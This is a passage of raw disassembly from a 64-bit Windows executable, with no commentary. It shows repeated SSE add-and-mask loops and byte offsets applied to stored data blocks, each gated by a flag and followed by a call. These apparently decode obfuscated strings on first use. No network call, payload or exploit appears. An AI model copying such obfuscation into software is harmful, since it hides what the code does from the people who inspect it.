   140005381:	66 0f fd 05 f7 f4 00 	paddw  0xf4f7(%rip),%xmm0        # 0x140014880
   140005388:	00 
   140005389:	66 0f db 05 af f2 00 	pand   0xf2af(%rip),%xmm0        # 0x140014640
   140005390:	00 
   140005391:	66 0f 7f 05 07 90 50 	movdqa %xmm0,0x509007(%rip)        # 0x14050e3a0
   140005398:	00 
   140005399:	f3 0f 7e 05 0f 90 50 	movq   0x50900f(%rip),%xmm0        # 0x14050e3b0
   1400053a0:	00 
   1400053a1:	66 0f fd 05 e7 f4 00 	paddw  0xf4e7(%rip),%xmm0        # 0x140014890
   1400053a8:	00 
   1400053a9:	66 0f db 05 cf f2 00 	pand   0xf2cf(%rip),%xmm0        # 0x140014680
   1400053b0:	00 
   1400053b1:	66 0f d6 05 f7 8f 50 	movq   %xmm0,0x508ff7(%rip)        # 0x14050e3b0
   1400053b8:	00 
   1400053b9:	8b 05 f9 8f 50 00    	mov    0x508ff9(%rip),%eax        # 0x14050e3b8
   1400053bf:	83 c0 5d             	add    $0x5d,%eax
   1400053c2:	0f b6 c0             	movzbl %al,%eax
   1400053c5:	66 89 05 ec 8f 50 00 	mov    %ax,0x508fec(%rip)        # 0x14050e3b8
   1400053cc:	c6 05 e7 8f 50 00 00 	movb   $0x0,0x508fe7(%rip)        # 0x14050e3ba
   1400053d3:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400053d8:	4c 8d 0d c1 8f 50 00 	lea    0x508fc1(%rip),%r9        # 0x14050e3a0
   1400053df:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   1400053e6:	b1 01                	mov    $0x1,%cl
   1400053e8:	49 89 f8             	mov    %rdi,%r8
   1400053eb:	e8 f0 da ff ff       	call   0x140002ee0
   1400053f0:	80 3d 4e 89 50 00 00 	cmpb   $0x0,0x50894e(%rip)        # 0x14050dd45
   1400053f7:	0f 84 72 66 00 00    	je     0x14000ba6f
   1400053fd:	80 3d d8 8f 50 00 00 	cmpb   $0x0,0x508fd8(%rip)        # 0x14050e3dc
   140005404:	74 67                	je     0x14000546d
   140005406:	66 0f 6f 05 b2 8f 50 	movdqa 0x508fb2(%rip),%xmm0        # 0x14050e3c0
   14000540d:	00 
   14000540e:	66 0f fd 05 9a f4 00 	paddw  0xf49a(%rip),%xmm0        # 0x1400148b0
   140005415:	00 
   140005416:	66 0f db 05 22 f2 00 	pand   0xf222(%rip),%xmm0        # 0x140014640
   14000541d:	00 
   14000541e:	66 0f 7f 05 9a 8f 50 	movdqa %xmm0,0x508f9a(%rip)        # 0x14050e3c0
   140005425:	00 
   140005426:	f3 0f 7e 05 a2 8f 50 	movq   0x508fa2(%rip),%xmm0        # 0x14050e3d0
   14000542d:	00 
   14000542e:	66 0f fd 05 8a f4 00 	paddw  0xf48a(%rip),%xmm0        # 0x1400148c0
   140005435:	00 
   140005436:	66 0f db 05 42 f2 00 	pand   0xf242(%rip),%xmm0        # 0x140014680
   14000543d:	00 
   14000543e:	66 0f d6 05 8a 8f 50 	movq   %xmm0,0x508f8a(%rip)        # 0x14050e3d0
   140005445:	00 
   140005446:	f3 0f 7e 05 8a 8f 50 	movq   0x508f8a(%rip),%xmm0        # 0x14050e3d8
   14000544d:	00 
   14000544e:	66 0f fd 05 7a f4 00 	paddw  0xf47a(%rip),%xmm0        # 0x1400148d0
   140005455:	00 
   140005456:	66 0f db 05 52 f2 00 	pand   0xf252(%rip),%xmm0        # 0x1400146b0
   14000545d:	00 
   14000545e:	66 0f 7e 05 72 8f 50 	movd   %xmm0,0x508f72(%rip)        # 0x14050e3d8
   140005465:	00 
   140005466:	c6 05 6f 8f 50 00 00 	movb   $0x0,0x508f6f(%rip)        # 0x14050e3dc
   14000546d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005472:	4c 8d 0d 47 8f 50 00 	lea    0x508f47(%rip),%r9        # 0x14050e3c0
   140005479:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   140005480:	b1 01                	mov    $0x1,%cl
   140005482:	49 89 f8             	mov    %rdi,%r8
   140005485:	e8 56 da ff ff       	call   0x140002ee0
   14000548a:	80 3d b5 88 50 00 00 	cmpb   $0x0,0x5088b5(%rip)        # 0x14050dd46
   140005491:	0f 84 2f 66 00 00    	je     0x14000bac6
   140005497:	80 3d b8 8f 50 00 00 	cmpb   $0x0,0x508fb8(%rip)        # 0x14050e456
   14000549e:	0f 84 f5 00 00 00    	je     0x140005599
   1400054a4:	66 0f 6f 05 34 f4 00 	movdqa 0xf434(%rip),%xmm0        # 0x1400148e0
   1400054ab:	00 
   1400054ac:	66 0f 6f 15 2c 8f 50 	movdqa 0x508f2c(%rip),%xmm2        # 0x14050e3e0
   1400054b3:	00 
   1400054b4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400054b8:	66 0f 6f 0d 80 f1 00 	movdqa 0xf180(%rip),%xmm1        # 0x140014640
   1400054bf:	00 
   1400054c0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400054c4:	66 0f 7f 15 14 8f 50 	movdqa %xmm2,0x508f14(%rip)        # 0x14050e3e0
   1400054cb:	00 
   1400054cc:	66 0f 6f 15 1c 8f 50 	movdqa 0x508f1c(%rip),%xmm2        # 0x14050e3f0
   1400054d3:	00 
   1400054d4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400054d8:	66 0f db d1          	pand   %xmm1,%xmm2
   1400054dc:	66 0f 7f 15 0c 8f 50 	movdqa %xmm2,0x508f0c(%rip)        # 0x14050e3f0
   1400054e3:	00 
   1400054e4:	66 0f 6f 15 14 8f 50 	movdqa 0x508f14(%rip),%xmm2        # 0x14050e400
   1400054eb:	00 
   1400054ec:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400054f0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400054f4:	66 0f 7f 15 04 8f 50 	movdqa %xmm2,0x508f04(%rip)        # 0x14050e400
   1400054fb:	00 
   1400054fc:	66 0f 6f 15 0c 8f 50 	movdqa 0x508f0c(%rip),%xmm2        # 0x14050e410
   140005503:	00 
   140005504:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005508:	66 0f db d1          	pand   %xmm1,%xmm2
   14000550c:	66 0f 7f 15 fc 8e 50 	movdqa %xmm2,0x508efc(%rip)        # 0x14050e410
   140005513:	00 
   140005514:	66 0f 6f 15 04 8f 50 	movdqa 0x508f04(%rip),%xmm2        # 0x14050e420
   14000551b:	00 
   14000551c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005520:	66 0f db d1          	pand   %xmm1,%xmm2
   140005524:	66 0f 7f 15 f4 8e 50 	movdqa %xmm2,0x508ef4(%rip)        # 0x14050e420
   14000552b:	00 
   14000552c:	66 0f 6f 15 fc 8e 50 	movdqa 0x508efc(%rip),%xmm2        # 0x14050e430
   140005533:	00 
   140005534:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005538:	66 0f db d1          	pand   %xmm1,%xmm2
   14000553c:	66 0f 7f 15 ec 8e 50 	movdqa %xmm2,0x508eec(%rip)        # 0x14050e430
   140005543:	00 
   140005544:	66 0f fd 05 f4 8e 50 	paddw  0x508ef4(%rip),%xmm0        # 0x14050e440
   14000554b:	00 
   14000554c:	66 0f db c1          	pand   %xmm1,%xmm0
   140005550:	66 0f 7f 05 e8 8e 50 	movdqa %xmm0,0x508ee8(%rip)        # 0x14050e440
   140005557:	00 
   140005558:	8b 05 f2 8e 50 00    	mov    0x508ef2(%rip),%eax        # 0x14050e450
   14000555e:	83 c0 6f             	add    $0x6f,%eax
   140005561:	0f b6 c0             	movzbl %al,%eax
   140005564:	66 89 05 e5 8e 50 00 	mov    %ax,0x508ee5(%rip)        # 0x14050e450
   14000556b:	0f b7 05 e0 8e 50 00 	movzwl 0x508ee0(%rip),%eax        # 0x14050e452
   140005572:	83 c0 6f             	add    $0x6f,%eax
   140005575:	0f b6 c0             	movzbl %al,%eax
   140005578:	66 89 05 d3 8e 50 00 	mov    %ax,0x508ed3(%rip)        # 0x14050e452
   14000557f:	8b 05 cf 8e 50 00    	mov    0x508ecf(%rip),%eax        # 0x14050e454
   140005585:	83 c0 6f             	add    $0x6f,%eax
   140005588:	0f b6 c0             	movzbl %al,%eax
   14000558b:	66 89 05 c2 8e 50 00 	mov    %ax,0x508ec2(%rip)        # 0x14050e454
   140005592:	c6 05 bd 8e 50 00 00 	movb   $0x0,0x508ebd(%rip)        # 0x14050e456
   140005599:	80 3d a7 87 50 00 00 	cmpb   $0x0,0x5087a7(%rip)        # 0x14050dd47
   1400055a0:	0f 84 c1 65 00 00    	je     0x14000bb67
   1400055a6:	80 3d c9 8e 50 00 00 	cmpb   $0x0,0x508ec9(%rip)        # 0x14050e476
   1400055ad:	74 5a                	je     0x140005609
   1400055af:	66 0f 6f 05 a9 8e 50 	movdqa 0x508ea9(%rip),%xmm0        # 0x14050e460
   1400055b6:	00 
   1400055b7:	66 0f fd 05 21 f3 00 	paddw  0xf321(%rip),%xmm0        # 0x1400148e0
   1400055be:	00 
   1400055bf:	66 0f db 05 79 f0 00 	pand   0xf079(%rip),%xmm0        # 0x140014640
   1400055c6:	00 
   1400055c7:	66 0f 7f 05 91 8e 50 	movdqa %xmm0,0x508e91(%rip)        # 0x14050e460
   1400055ce:	00 
   1400055cf:	66 0f 6f 05 99 8e 50 	movdqa 0x508e99(%rip),%xmm0        # 0x14050e470
   1400055d6:	00 
   1400055d7:	66 0f fd 05 21 f3 00 	paddw  0xf321(%rip),%xmm0        # 0x140014900
   1400055de:	00 
   1400055df:	66 0f db 05 c9 f0 00 	pand   0xf0c9(%rip),%xmm0        # 0x1400146b0
   1400055e6:	00 
   1400055e7:	66 0f 7e 05 81 8e 50 	movd   %xmm0,0x508e81(%rip)        # 0x14050e470
   1400055ee:	00 
   1400055ef:	8b 05 7f 8e 50 00    	mov    0x508e7f(%rip),%eax        # 0x14050e474
   1400055f5:	83 c0 6f             	add    $0x6f,%eax
   1400055f8:	0f b6 c0             	movzbl %al,%eax
   1400055fb:	66 89 05 72 8e 50 00 	mov    %ax,0x508e72(%rip)        # 0x14050e474
   140005602:	c6 05 6d 8e 50 00 00 	movb   $0x0,0x508e6d(%rip)        # 0x14050e476
   140005609:	48 8d 0d d0 8d 50 00 	lea    0x508dd0(%rip),%rcx        # 0x14050e3e0
   140005610:	48 8d 15 49 8e 50 00 	lea    0x508e49(%rip),%rdx        # 0x14050e460
   140005617:	e8 54 e6 ff ff       	call   0x140003c70
   14000561c:	80 3d 25 87 50 00 00 	cmpb   $0x0,0x508725(%rip)        # 0x14050dd48
   140005623:	0f 84 8d 65 00 00    	je     0x14000bbb6
   140005629:	80 3d d2 8e 50 00 00 	cmpb   $0x0,0x508ed2(%rip)        # 0x14050e502
   140005630:	0f 84 e6 00 00 00    	je     0x14000571c
   140005636:	66 0f 6f 05 d2 f2 00 	movdqa 0xf2d2(%rip),%xmm0        # 0x140014910
   14000563d:	00 
   14000563e:	66 0f 6f 15 3a 8e 50 	movdqa 0x508e3a(%rip),%xmm2        # 0x14050e480
   140005645:	00 
   140005646:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000564a:	66 0f 6f 0d ee ef 00 	movdqa 0xefee(%rip),%xmm1        # 0x140014640
   140005651:	00 
   140005652:	66 0f db d1          	pand   %xmm1,%xmm2
   140005656:	66 0f 7f 15 22 8e 50 	movdqa %xmm2,0x508e22(%rip)        # 0x14050e480
   14000565d:	00 
   14000565e:	66 0f 6f 15 2a 8e 50 	movdqa 0x508e2a(%rip),%xmm2        # 0x14050e490
   140005665:	00 
   140005666:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000566a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000566e:	66 0f 7f 15 1a 8e 50 	movdqa %xmm2,0x508e1a(%rip)        # 0x14050e490
   140005675:	00 
   140005676:	66 0f 6f 15 22 8e 50 	movdqa 0x508e22(%rip),%xmm2        # 0x14050e4a0
   14000567d:	00 
   14000567e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005682:	66 0f db d1          	pand   %xmm1,%xmm2
   140005686:	66 0f 7f 15 12 8e 50 	movdqa %xmm2,0x508e12(%rip)        # 0x14050e4a0
   14000568d:	00 
